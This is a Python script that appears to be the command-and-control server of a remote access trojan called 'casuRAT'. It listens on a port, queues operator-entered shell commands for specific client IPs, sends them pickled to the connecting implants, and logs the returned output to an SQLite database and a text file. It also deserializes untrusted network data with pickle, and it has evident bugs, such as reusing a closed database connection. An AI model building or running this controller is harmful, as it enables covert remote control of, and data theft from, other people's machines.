#!python3

# Standard libraries only.
import sys
import socket
import time
import pickle
import sqlite3


if len(sys.argv) != 3:
    print("usage:", sys.argv[0], "<lhost> <lport>")
    sys.exit(1)


lhost, lport = sys.argv[1], int(sys.argv[2])
lserver = (lhost, lport)
dill_refuse = pickle.dumps("refused")
cmd_list = []
cmd_list2 = []
dbconn = sqlite3.connect('casuRAT.db')
c = dbconn.cursor()


def take_cmds():
# Recieve a client IP and command queue from a user.
    cmd_input = str(input("What is the IP of the client: "))
    if cmd_input:
        cmd_list.append(cmd_input)
        cmd_input = None
        while True:
            cmd_input = (str(input("Queue a command, or hit enter if done: ")))
            if cmd_input:
                cmd_list.append(cmd_input)
                cmd_input = None
            elif len(cmd_list) >= 2:
                print (cmd_list, "\n")
                global dill_cmd
                dill_cmd = pickle.dumps(cmd_list[1:])
                return
            else:
                print("no commands supplied")
    else:
        print("I need a client IP cheif")
        sys.exit(1)


def take_cmds2():
# Recieve a second client IP and command queue from a user.
        cmd_input2 = str(input("Additional client IP. If none, hit enter: "))
        if cmd_input2:
            cmd_list2.append(cmd_input2)
            cmd_input2 = None
            while True:
                cmd_input2 = str(input("Queue a command, or hit enter if done: "))
                if cmd_input2:
                    cmd_list2.append(cmd_input2)
                    cmd_input2 = None
                elif len(cmd_list2) >= 2:
                    print (cmd_list2, "\n")
                    global dill_cmd2
                    dill_cmd2 = pickle.dumps(cmd_list2[1:])
                    return
                else:
                    print("no commands supplied")
        else:
            print("All done, listening now...")
            return


def send_cmd(caddr, clist):
# Send the appropriate command list after pickleing it.
        global sent_list
        sent_list = " ".join(clist[1:])
        print('Connection from', caddr, "\n")
        dill_cmd = pickle.dumps(clist)
        conn.send(dill_cmd)


def return_cmds(sock, raddr, timeout=2):
# Recieve the command results, and print them to stdout/file.
    while True:
        output = ''
        total_output= ''
        begin = time.time()
        while True:
            if total_output and time.time() - begin > timeout:
                break
            elif time.time()-begin > timeout*2:
                break
            try:        
                output = pickle.loads(conn.recv(1024))
                if output:
                    total_output += output
                    begin=time.time()
                else:
                    conn.close()
                    return
            except:
                pass
        utctime = time.asctime(time.gmtime())
        print(addr[0] + ' | ' + utctime + ' | ' + sent_list + total_output + '\n')
        sql_push = (str(addr[0]), str(utctime), str(sent_list), str(total_output))
        c.execute('INSERT INTO HISTORY VALUES (?,?,?,?)', sql_push)
        with open('casulog.txt','a') as log:
            log.write(total_output)      
            return


query_ask = input("Would you like to query the command history (y/n)?: ")
if query_ask.lower() in ['y', 'yes']:
    for row in c.execute('SELECT * FROM HISTORY ORDER BY utc_time'):
        print(row)


take_cmds()
take_cmds2()


while True:
# Core loop, start with setting up socket bind and listen.
    if not cmd_list and not cmd_list2:
        print("All commands retrieved")
        sys.exit(1)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(lserver)
    print("\nListening on", lserver)
    if cmd_list:
        print("Waiting to pass", cmd_list[1:], "to IP 1:", cmd_list[0])
    if cmd_list2:
        print("Waiting to pass", cmd_list2[1:], "to IP 2:", cmd_list2[0])
    s.listen()
    try:
        (conn, addr) = s.accept()
    except KeyboardInterrupt:
# Graceful exit with ctrl+c while blocking.
        sys.exit(1)
    else:
# Check the remote connection address against the queued IPs.
        if cmd_list:
            if addr[0] == cmd_list[0]:
                send_cmd(addr, cmd_list)
                return_cmds(s, addr[0])
                cmd_list = []
            else:
                print(addr[0], "tried to connect, but was not", cmd_list[0])
        if cmd_list2:
            if addr[0] == cmd_list2[0]:
                send_cmd(addr, cmd_list2)
                return_cmds(s, addr[0])
                cmd_list2 = []
            else:
                print(addr[0], "tried to connect, but was not", cmd_list2[0])
# Send a string to client resetting hanging, then reset the server socket.
    dbconn.commit()
    dbconn.close()
    conn.send(dill_refuse)
    s.close()
    s = None